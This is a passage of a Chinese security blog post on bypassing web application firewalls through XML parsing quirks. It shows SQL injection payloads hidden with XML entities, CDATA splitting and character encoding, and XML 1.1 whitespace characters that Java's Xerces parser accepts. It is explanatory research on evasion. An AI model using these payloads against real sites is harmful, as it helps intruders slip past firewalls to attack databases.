-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>" union select 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>使用本地实体：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test1</span> <span class="meta-string">"select"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test2</span> <span class="meta-string">"union"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>" &amp;test2; &amp;test1; 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>使用HTML编码、CDATA也可以：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test1</span> <span class="meta-string">"&lt;![CDATA[el]]&gt;ect"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test2</span> <span class="meta-string">"&amp;#x75;&amp;#x6e;&amp;#x69;&amp;#x6f;&amp;#x6e;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>" &amp;test2; &amp;test1; 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="4-XML1-1"><a href="#4-XML1-1" class="headerlink" title="4. XML1.1"></a>4. XML1.1</h1><h2 id="4-1-space-char"><a href="#4-1-space-char" class="headerlink" title="4.1 space char"></a>4.1 space char</h2><p>当XML版本被声明为1.1时，XML的解析将支持一些额外的空白字符、控制字符。</p>
-<p>jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\impl\XML11EntityScanner.java：</p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/xml11_space_char.png" alt></p>
-<p>jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\parsers\XML11Configuration.java：</p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/xml11Configuration.png" alt></p>
-<p>代码中的\x85是指码点，而非我们平时所见的unicdoe字符。而\x85二进制为‭10000101‬，高位为1，根据笔者认知，UTF-8无法使得8比特码点成为UTF-8字符，因此我们无法在UTF-8中使用它，但在ISO-8859-1、UTF-16等字符集中我们可以使用它：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.1" encoding="iso-8859-1"?&gt;</span>%85<span class="tag">&lt;<span class="name">root%85</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">root%85</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>在UTF-16BE中对应的unicode字符为\x00\x85：</p>
-<p>同样的，\x28\x20是指码点，其UTF-8编码字符为%E2%80%A8，推导过程如下：</p>
-<p>\x20 \x28转2进制比特：<br>00100000 00101000<br>UTF-8中三个字节的编码规范：<br>1110XXXX 10XXXXXX 10XXXXXX<br>\x20\x28转UTF-8的2进制比特：<br>11100010 10000000 10101000<br>\x20\x28的UTF-8编码为:<br>%E2%80%A8</p>
-<p>于是我们可以对XML文档进行如下修改：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.1" encoding="utf-8"?&gt;</span>%E2%80%A8<span class="tag">&lt;<span class="name">root%E2%80%A8</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">root%E2%80%A8</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>由于底层代码逻辑多，起初还想边看边画一些要点的逻辑流程，但是这样太慢了，前期收益太低。现在看来，这样会导致无法详尽逻辑点，也让后期的再次整理与回顾变得艰难，另外笔者看代码时也遗漏了一些绕过方式，如PI分割字符串。常见的XML服务器，除开JAVA外，还有.NET、PHP，而作为XML的子集SOAP，不知SOAP自身是否还有其他骚操作，这样想来，本文总结的绕过手法也未必详尽。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/">展开全文 >></a>
         </p>
       
 
